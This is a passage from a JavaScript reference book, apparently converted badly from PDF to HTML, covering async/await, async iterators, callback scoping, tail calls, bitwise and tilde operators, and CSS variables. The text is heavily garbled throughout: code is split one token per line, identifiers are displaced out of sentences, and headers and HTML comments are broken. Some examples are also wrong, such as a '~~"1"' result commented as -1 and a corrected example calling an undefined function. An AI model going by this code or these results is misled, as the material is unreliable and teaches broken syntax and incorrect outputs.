;
}
At first sight, it seems valid, but it&apos;s not. Due to operator
precedence, it&apos;s equivalent to the following:
async
**function**
myAsyncFunction
(
)
{
await
(
getUnicorn
(
)
.
getSize
(
)
)
;
}
getSize
Here we attempt to call () method of the Promise object, which isn&apos;t
what we want.
getSize
Instead, we should use brackets to denote that we first want to wait
for the unicorn, and then call () method of the result:
async
**function**
asyncFunction
(
)
{
(
await getUnicorn
(
)
)
.
getSize
(
)
;
}
getUnicorn
getSize
Of course. the previous version could be valid in some cases, for
example, if the () function was synchronous, but the () method was
asynchronous.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch81-3">Section 81.3: Async functions compared to Promises</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
async functions do not replace the Promise type; they add language
keywords that make promises easier to call. They are interchangeable:
async
**function**
doAsyncThing
(
)
{
&hellip;
}
**function**
doPromiseThing
(
input
)
{
**return**
**new**
Promise
(
(
r
,
x
)
=&gt;
&hellip;
)
;
}
// <i>Call with promise syntax*
doAsyncThing
(
)
.
then
(
a
=&gt;
doPromiseThing
(
a
)
)
.
then
(
b
=&gt;
&hellip;
)
.
**catch**
(
ex
=&gt;
&hellip;
)
;
// <i>Call with await syntax*
**try**
{
**const**
a
=
await doAsyncThing
(
)
;
**const**
b
=
await doPromiseThing
(
a
)
;
&hellip;
}
**catch**
(
ex
)
{
&hellip;
}
Any function that uses chains of promises can be rewritten using
await:
**function** newUnicorn() { **return** fetch(&apos;unicorn.json&apos;) // <i>
fetch unicorn.json from server*
.then(responseCurrent =&bsol;responseCurrent.json()) // <i>parse the
response as JSON*
.then(unicorn =&bsol;fetch(&apos;new/unicorn&apos;, { // <i>send a request to
&apos;new/unicorn&apos;</i> method: &apos;post&apos;, // <i>using the POST method* body:
JSON.stringify({unicorn}) // <i>pass the unicorn to the request body*
})
)
.then(responseNew =&bsol;responseNew.json())
.then(json =&bsol;json.success) // <i>return success property of response*
.**catch**(err =&bsol;console.log(&apos;Error creating unicorn:&apos;, err));
}
The function can be rewritten using async / await as follows:
async **function** newUnicorn() { **try** {
**const** responseCurrent = await fetch(&apos;unicorn.json&apos;); // <i>fetch
unicorn.json from server* **const** unicorn = await
responseCurrent.json(); // <i>parse the response as JSON* **const**
responseNew = await fetch(&apos;new/unicorn&apos;, { // <i>send a request to
&apos;new/unicorn&apos;</i> method: &apos;post&apos;, // <i>using the POST method* body:
JSON.stringify({unicorn}) // <i>pass the unicorn to the request body*
}); **const** json = await responseNew.json(); **return** json.success
// <i>return success property of response*
} **catch** (err) { console.log(&apos;Error creating unicorn:&apos;, err); }
}
newUnicorn
This async variant of () appears to return a Promise, but really there
were multiple await keywords. Each one returned a Promise, so really
we had a collection of promises rather than a chain.
**function**   &ast; generator, with each await being a   yield **new** Promise
In fact we can think of it as a . However, the
results of each promise are needed by the next to continue the
function. This is why the additional keyword async is needed on the
function (as well as the await keyword when calling the promises) as
it tells JavaScript to
async **function** newUnicorn
automatically creates an observer for this iteration. The Promise
returned by () resolves when this iteration completes.
Practically, you don&apos;t need to consider that; await hides the promise
and async hides the generator iteration.
then
You can call async functions as if they were promises, and await any
promise or any async function. You don&apos;t need to await an async
function, just as you can execute a promise without a .().
You can also use an async
[IIFE](https://en.wikipedia.org/wiki/Immediately-invoked_function_expression)
if you want to execute that code immediately:
(
async
(
)
=&gt;
{
await makeCoffee
(
)
console.
log
(
&apos;coffee is ready!&apos;
)
}
)
(
)
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch81-4">Section 81.4: Looping with async await</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
When using async await in loops, you might encounter some of these
problems.
If you just try to use await inside forEach, this will throw an
Unexpected token error.
(
async
(
)
=&gt;
{
data
=
&lbrack;
1
,
2
,
3
,
4
,
5
&rbrack;
;
data.
forEach
(
e
=&gt;
{
**const**
i
=
await somePromiseFn
(
e
)
;
console.
log
(
i
)
;
}
)
;
}
)
(
)
;
This comes from the fact that you&apos;ve erroneously seen the arrow
function as a block. The await will be in the context of the callback
function, which is not async.
The interpreter protects us from making the above error, but if you
add async to the forEach callback no errors get thrown. You might
think this solves the problem, but it won&apos;t work as expected.
Example:
(async() =&bsol;{ data = &lbrack;1, 2, 3, 4, 5&rbrack;;
data.
forEach
(
async
(
e
)
=&gt;
{
**const**
i
=
await somePromiseFn
(
e
)
;
console.
log
(
i
)
;
}
)
;
console.
log
(
&apos;this will print first&apos;
)
;
}
)
(
)
;
This happens because the callback async function can only pause
itself, not the parent async function.
await asyncForEach   (   async   &lpar;e&rpar;   =&bsol;await somePromiseFn    (e),   data
You could write an asyncForEach function that returns a promise and
then you could something like
) Basically you return a promise that resolves when all the callbacks
are awaited and done. But there are better ways of doing this, and
that is to just use a loop.
for       &minus;   of    loop or a                 **for**   /   while
You can use a loop, it doesn&apos;t really matter which one you pick.
(
async
(
)
=&gt;
{
data
=
&lbrack;
1
,
2
,
3
,
4
,
5
&rbrack;
;
**for**
(
**let**
e of data
)
{
**const**
i
=
await somePromiseFn
(
e
)
;
console.
log
(
i
)
;
}
console.
log
(
&apos;this will print last&apos;
)
;
}
)
(
)
;
But there&apos;s another catch. This solution will wait for each call to
somePromiseFn to complete before iterating over the next one.
Promise.all
This is great if you actually want your somePromiseFn invocations to
be executed in order but if you want them to run concurrently, you
will need to await on .
(
async
(
)
=&gt;
{
data
=
&lbrack;
1
,
2
,
3
,
4
,
5
&rbrack;
;
**const**
p
=
await Promise.
all
(
data.
map
(
async
(
e
)
=&gt;
await somePromiseFn
(
e
)
)
)
;
console.
log
(
&hellip;
p
)
;
}
)
(
)
;
Promise.all
receives an array of promises as its only parameter and returns a
promise. When all of the promises
in the array are resolved, the returned promise is also resolved. We
await on that promise and when it&apos;s resolved all our values are
available.
stage
The above examples are fully runnable. The somePromiseFn function can
be made as an async echo function with a timeout. You can try out the
examples in the [babel-repl](https://babeljs.io/repl) with at least
the -3 preset and look at the output.
**function**
somePromiseFn
(
n
)
{
**return**
**new**
Promise
(
(
res
,
rej
)
=&gt;
{
setTimeout
(
(
)
=&gt;
res
(
n
)
,
250
)
;
}
)
;
}
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch81-5">Section 81.5: Less indentation</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
With promises:
**function** doTheThing() { **return** doOneThing()
.
then
(
doAnother
)
.
then
(
doSomeMore
)
.
**catch**
(
handleErrors
)
}
With async functions:
async
**function**
doTheThing
(
)
{
**try**
{
**const**
one
=
await doOneThing
(
)
;
**const**
another
=
await doAnother
(
one
)
;
**return**
await doSomeMore
(
another
)
;
}
**catch**
(
err
)
{
handleErrors
(
err
)
;
}
}
**try**   / **catch**
Note how the return is at the bottom, and not at the top, and you use
the language&apos;s native error-handling mechanics ().
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch81-6">Section 81.6: Simultaneous async (parallel) operations</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Promise.all
Often you will want to perform asynchronous operations in parallel.
There is direct syntax that supports this in the async/await proposal,
but since await will wait for a promise, you can wrap multiple
promises together in to wait for them:
// <i>Not in parallel*
async
**function**
getFriendPosts
(
user
)
{
friendIds
=
await db.
**get**
(
&quot;friends&quot;
,
{
user
}
,
{
id
:
1
}
)
;
friendPosts
=
&lbrack;
&rbrack;
;
**for**
(
**let**
id
**in**
friendIds
)
{
friendPosts
=
friendPosts.
concat
(
await db.
**get**
(
&quot;posts&quot;
,
{
user
:
id
}
)
)
;
}
// <i>etc.*
}
This will do each query to get each friend&apos;s posts serially, but they
can be done simultaneously:
// <i>In parallel*
async
**function**
getFriendPosts
(
user
)
{
friendIds
=
await.
db
.
**get**
(
&quot;friends&quot;
,
{
user
}
,
{
id
:
1
}
)
;
friendPosts
=
await Promise.
all
(
friendIds.
map
(
id
=&gt;
db.
**get**
(
&quot;posts&quot;
,
{
user
:
id
}
)
)
;
// <i>etc.*
}
Promise.all
This will loop over the list of IDs to create an array of promises.
await will wait for *all* promises to be complete. combines them into
a single promise, but they are done in parallel.

<h3 id="ch82">Chapter 82: Async Iterators</h3>

An async function is one that returns a promise. await yields to the
caller until the promise resolves and then continues with the result.
for &minus; of
An iterator allows the collection to be looped through with a loop.
for  &minus;    await    &minus;  of
An async iterator is a collection where each iteration is a promise
which can be awaited using a loop.
&bsol;harmony                &minus;   async          &minus;   iteration
Async iterators are a [stage 3
proposal](https://github.com/tc39/proposal-async-iteration). They are
in Chrome Canary 60 with
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch82-1">Section 82.1: Basics</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
next
A JavaScript Iterator is an object with a .() method, which returns an
IteratorItem, which is an object with
boolean
value
any  &bsol;and  done
: &lt;: &lt;&gt;.
  next   () method, which returns a          Promise    &lt;   IteratorItem
A JavaScript AsyncIterator is an object with a .&gt;, a *promise* for
the next value.
To create an AsyncIterator, we can use the *async generator* syntax:
<i>/&ast;&ast;</i>
*&ast; Returns a promise which resolves after time had passed.*
*&ast;/*
**const**
delay
=
time
=&gt;
**new**
Promise
(
resolve
=&gt;
setTimeout
(
resolve
,
time
)
)
;
async
**function**
&ast;
delayedRange
(
max
)
{
**for**
(
**let**
i
=
0
;
i
&lt;
max
;
i
++
)
{
await delay
(
1000
)
;
yield i
;
}
}
The delayedRange function will take a maximum number, and returns an
AsyncIterator, which yields numbers from 0 to that number, in 1 second
intervals.
Usage:
**for**
await
(
**let**
number of delayedRange
(
10
)
)
{
console.
log
(
number
)
;
}
**for** await of
**for** await of
The loop is another piece of new syntax, available only inside of
async functions, as well as async generators. Inside the loop, the
values yielded (which, remember, are Promises) are unwrapped, so the
Promise is hidden away. Within the loop, you can deal with the direct
values (the yielded numbers), the loop will wait for the Promises on
your behalf.
**for** await of
The above example will wait 1 second, log 0, wait another second, log
1, and so on, until it logs 9. At which point the AsyncIterator will
be done, and the loop will exit.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch83">Chapter 83: How to make iterator usable inside async callback function</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
When using async callback we need to consider scope. **Especially** if
inside a loop. This simple article shows what not to do and a simple
working example.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch83-1">Section 83.1: Erroneous code, can you spot why this usage of key will lead to bugs?</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
**var**
pipeline
=
{
}
;
// <i>(&hellip;) adding things in pipeline*
**for**
(
**var**
key
**in**
pipeline
)
{
fs.
stat
(
pipeline
&lbrack;
key
&rbrack;
.
path
,
**function**
(
err
,
stats
)
{
**if**
(
err
)
{
// <i>clear that one*
**delete**
pipeline
&lbrack;
key
&rbrack;
;
**return**
;
}
// <i>(&hellip;)*
pipeline
&lbrack;
key
&rbrack;
.
count
++
;
}
)
;
}
The problem is that there is only one instance of **var key**. All
callbacks will share the same key instance. At the time the callback
will fire, the key will most likely have been incremented and not
pointing to the element we are receiving the stats for.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch83-2">Section 83.2: Correct Writing</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
**var**
pipeline
=
{
}
;
// <i>(&hellip;) adding things in pipeline*
**var**
processOneFile
=
**function**
(
key
)
{
fs.
stat
(
pipeline
&lbrack;
key
&rbrack;
.
path
,
**function**
(
err
,
stats
)
{
**if**
(
err
)
{
// <i>clear that one*
**delete**
pipeline
&lbrack;
key
&rbrack;
;
**return**
;
}
// <i>(&hellip;)*
pipeline
&lbrack;
key
&rbrack;
.
count
++
;
}
)
;
}
;
// <i>verify it is not growing*
**for**
(
**var**
key
**in**
pipeline
)
{
processOneFileInPipeline
(
key
)
;
}
By creating a new function, we are scoping **key** inside a function
so all callback have their own key instance.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch84">Chapter 84: Tail Call Optimization</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch84-1">Section 84.1: What is Tail Call Optimization (TCO)</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
TCO is only available in strict mode
As always check browser and JavaScript implementations for support of
any language features, and as with any JavaScript feature or syntax,
it may change in the future.
It provides a way to optimise recursive and deeply nested function
calls by eliminating the need to push function state onto the global
frame stack, and avoiding having to step down through each calling
function by returning directly to the initial calling function.
**function**
a
(
)
{
**return**
b
(
)
;
// <i>2*
}
**function**
b
(
)
{
**return**
1
;
// <i>3*
}
a
(
)
;
// <i>1*
Without TCO the call to a() creates a new frame for that function.
When that function calls b() the a()&apos;s frame is pushed onto the frame
stack and a new frame is created for function b()
When b() return to a() a()&apos;s frame is popped from the frame stack. It
immediately return to the global frame and thus does not use any of
the states save on the stack.

TCO recognises that the call from a() to b() is at the tail of
function a() and thus there is no need to push a()&apos;s state onto the
frame stack. When b(0) returns rather than returning to a() it returns
directly to the global frame. Further optimising by eliminating the
intermediate steps.

TCO allows for recursive functions to have indefinite recursion as the
frame stack will not grow with each recursive call. Without TCO
recursive function had a limited recursive depth.

**Note** TCO is a JavaScript engine implementation feature, it cannot
be implemented via a transpiler if the browser does not support it.
There is no additional syntax in the spec required to implement TCO
and thus there is concern that TCO may break the web. Its release into
the world is cautious and may require browser/engine specific flags to
be set for the perceivable future.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch84-2">Section 84.2: Recursive loops</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Tail Call Optimisation makes it possible to safely implement recursive
loops without concern for call stack overflow or the overhead of a
growing frame stack.
**function**
indexOf
(
array
,
predicate
,
i
=
0
)
{
**if**
(
0
&lt;=
i
&&
i
&lt;
array.
length
)
{
**if**
(
predicate
(
array
&lbrack;
i
&rbrack;
)
)
{
**return**
i
;
}
**return**
indexOf
(
array
,
predicate
,
i
&plus;
1
)
;
// <i>the tail call*
}
}
indexOf
(
&lbrack;
1
,
2
,
3
,
4
,
5
,
6
,
7
&rbrack;
,
x
=&gt;
x
===
5
)
;
// <i>returns index of 5 which is 4*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch85">Chapter 85: Bitwise Operators - Real World Examples (snippets)</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch85-1">Section 85.1: Swapping Two Integers with Bitwise XOR (without additional memory allocation)</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
**var**
a
=
11
,
b
=
22
;
a
=
a
&Hat;
b
;
b
=
a
&Hat;
b
;
a
=
a
&Hat;
b
;
console.
log
(
&quot;a = &quot;
&plus;
a
&plus;
&quot;; b = &quot;
&plus;
b
)
;
// <i>a is now 22 and b is now 11*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch85-2">Section 85.2: Faster multiplication or division by powers of 2</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
13 &ast; (10 &ast;&ast; 2)
Shifting bits left (right) is equivalent to multiplying (dividing) by
2. It&apos;s the same in base 10: if we &quot;left-shift&quot; 13 by 2 places, we
get 1300, or . And if we take 12345 and &quot;right-shift&quot; by 3 places
and then remove the
Math.floor(12345 / (10 &ast;&ast;   . So if we want to multiply a      2 &ast;&ast;
3)) variable by  n
decimal part, we get 12, or , we can just left-shift by n bits.
console.
log
(
13
&ast;
(
2
&ast;&ast;
6
)
)
// <i>13 &ast; 64 = 832*
console.
log
(
13
&lt;&lt;
6
)
// <i>832*
2 &ast;&ast; n
Similarly, to do (floored) integer division by , we can right shift by
n bits. Example:
console.
log
(
1000
/
(
2
&ast;&ast;
4
)
)
// <i>1000 / 16 = 62.5*
console.
log
(
1000
&gt;&gt;
4
)
// <i>62*
It even works with negative numbers:
console.
log
(
&minus;
80
/
(
2
&ast;&ast;
3
)
)
// <i>-80 / 8 = -10*
console.
log
(
&minus;
80
&gt;&gt;
3
)
// <i>-10*
In reality, speed of arithmetic is unlikely to significantly impact
how long your code takes to run, unless you are doing on the order of
100s of millions of computations. But C programmers love this sort of
thing!
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch85-3">Section 85.3: Number&apos;s Parity Detection with Bitwise AND</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Instead of this (unfortunately too often seen in the real code)
&quot;masterpiece&quot;:
**function**
isEven
(
n
)
{
**return**
n
&percnt;
2
==
0
;
}
**function**
isOdd
(
n
)
{
**if**
(
isEven
(
n
)
)
{
**return**
**false**
;
}
**else**
{
**return**
**true**
;
}
}
You can do the parity check much more effective and simple:
**if**
(
n
&
1
)
{
console.
log
(
&quot;ODD!&quot;
)
;
}
**else**
{
console.
log
(
&quot;EVEN!&quot;
)
;
}
(this is actually valid not only for JavaScript)
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch86">Chapter 86: Tilde &bsol;~<h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
The &bsol;~ operator looks at the binary representation of the values of
the expression and does a bitwise negation operation on it.
Any digit that is a 1 in the expression becomes a 0 in the result. Any
digit that is a 0 in the expression becomes a 1 in the result.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch86-1">Section 86.1: &bsol;~ Integer</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
The following example illustrates use of the bitwise NOT (&bsol;~) operator
on integer numbers.
**let**
number
=
3
;
**let**
complement
=
&bsol;~number
;
Result of the complement number equals to -4;
**Expression Binary value Decimal value**
3 00000000 00000000 00000000 00000011 3
&bsol;~3
11111111
11111111
11111111
11111100
-4
To simplify this, we can think of it as function
f
(
n
)
=
&minus;
(
n
&plus;
1
)
.
**let**
a
=
&bsol;~
&minus;
2
;
// <i>a is now 1*
**let**
b
=
&bsol;~
&minus;
1
;
// <i>b is now 0*
**let**
c
=
&bsol;~
0
;
// <i>c is now -1*
**let**
d
=
&bsol;~
1
;
// <i>d is now -2*
**let**
e
=
&bsol;~
2
;
// <i>e is now -3*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch86-2">Section 86.2: &bsol;~&bsol;~ Operator</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Double Tilde &bsol;~&bsol;~ will perform bitwise NOT operation twice.
The following example illustrates use of the bitwise NOT (&bsol;~&bsol;~)
operator on decimal numbers.
To keep the example simple, decimal number 3.5 will be used, cause of
it&apos;s simple representation in binary format.
**let**
number
=
3.5
;
**let**
complement
=
&bsol;~number
;
Result of the complement number equals to -4;
**Expression Binary value Decimal value**
3 00000000 00000000 00000000 00000011 3
&bsol;~&bsol;~3 00000000 00000000 00000000 00000011 3
00000000 00000011.1
3.53.5
&bsol;~&bsol;~3.5 00000000 00000011 3
integer
f2
g2
To simplify this, we can think of it as functions (n) = -(-(n+1) + 1)
and (n) = -(-((n)+1) + 1).

**f2(n)** will leave the integer number as it is.
**let**
a
=
&bsol;~&bsol;~
&minus;
2
;
// <i>a is now -2*
**let**
b
=
&bsol;~&bsol;~
&minus;
1
;
// <i>b is now -1*
**let**
c
=
&bsol;~&bsol;~
0
;
// <i>c is now 0*
**let**
d
=
&bsol;~&bsol;~
1
;
// <i>d is now 1*
**let**
e
=
&bsol;~&bsol;~
2
;
// <i>e is now 2*
**g2(n)** will essentially round positive numbers down and negative
numbers up.
**let**
a
=
&bsol;~&bsol;~
&minus;
2.5
;
// <i>a is now -2*
**let**
b
=
&bsol;~&bsol;~
&minus;
1.5
;
// <i>b is now -1*
**let**
c
=
&bsol;~&bsol;~
0.5
;
// <i>c is now 0*
**let**
d
=
&bsol;~&bsol;~
1.5
;
// <i>d is now 1*
**let**
e
=
&bsol;~&bsol;~
2.5
;
// <i>e is now 2*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch86-3">Section 86.3: Converting Non-numeric values to Numbers</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
&bsol;~&bsol;~ Could be used on non-numeric values. A numeric expression will be
first converted to a number and then performed bitwise NOT operation
on it.

If expression cannot be converted to numeric value, it will convert to
0.

**true** and **false** bool values are exceptions, where **true** is
presented as numeric value 1 and **false** as 0
**let**
a
=
&bsol;~&bsol;~
&quot;-2&quot;
;
// <i>a is now -2*
**let**
b
=
&bsol;~&bsol;~
&quot;1&quot;
;
// <i>b is now -1*
**let**
c
=
&bsol;~&bsol;~
&quot;0&quot;
;
// <i>c is now 0*
**let**
d
=
&bsol;~&bsol;~
&quot;true&quot;
;
// <i>d is now 0*
**let**
e
=
&bsol;~&bsol;~
&quot;false&quot;
;
// <i>e is now 0*
**let**
f
=
&bsol;~&bsol;~
**true**
;
// <i>f is now 1*
**let**
g
=
&bsol;~&bsol;~
**false**
;
// <i>g is now 0*
**let**
h
=
&bsol;~&bsol;~
&quot;&quot;
;
// <i>h is now 0*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch86-4">Section 86.4: Shorthands</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
We can use &bsol;~ as a shorthand in some everyday scenarios.
We know that &bsol;~ converts -1 to 0, so we can use it with indexOf on
array. **indexOf**
**let**
items
=
&lbrack;
&apos;foo&apos;
,
&apos;bar&apos;
,
&apos;baz&apos;
&rbrack;
;
**let**
el
=
&apos;a&apos;
;
**if**
(
items.
indexOf
(
&apos;a&apos;
)
!==
&minus;
1
)
{
}
or
**if**
(
items.
indexOf
(
&apos;a&apos;
)
&gt;=
0
)
{
}
**can be re-written as if** (&bsol;~items.indexOf(&apos;a&apos;)) {}
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch86-5">Section 86.5: &bsol;~ Decimal</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
The following example illustrates use of the bitwise NOT (&bsol;~) operator
on decimal numbers.
To keep the example simple, decimal number 3.5 will be used, cause of
it&apos;s simple representation in binary format.
**let**
number
=
3.5
;
**let**
complement
=
&bsol;~number
;
Result of the complement number equals to -4;
**Expression Binary value Decimal value**
00000000 00000010.1
3.53.5
&bsol;~3.5
11111111
11111100
-4
To simplify this, we can think of it as function
f
(
n
)
=
&minus;
(
integer
(
n
)
&plus;
1
)
.
**let**
a
=
&bsol;~
&minus;
2.5
;
// <i>a is now 1*
**let**
b
=
&bsol;~
&minus;
1.5
;
// <i>b is now 0*
**let**
c
=
&bsol;~
0.5
;
// <i>c is now -1*
**let**
d
=
&bsol;~
1.5
;
// <i>c is now -2*
**let**
e
=
&bsol;~
2.5
;
// <i>c is now -3*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch87">Chapter 87: Using JavaScript to get/set CSS custom variables</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
cSection 87.1: How to get and set CSS variable property values</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
To get a value use the .getPropertyValue() method
element.
style
.
getPropertyValue
(
&quot;&bsol;var&quot;
)
To set a value use the .setProperty() method.
element.
style
.
setProperty
(
&quot;&bsol;var&quot;
,
&quot;NEW_VALUE&quot;
)
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch88">Chapter 88: Selection API</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
**Parameter Details**
If the node is a Text node, it is the number of characters from the
beginning of startNode to where the
startOffset range begins. Otherwise, it is the number of child nodes
between the beginning of startNode to where the range begins.
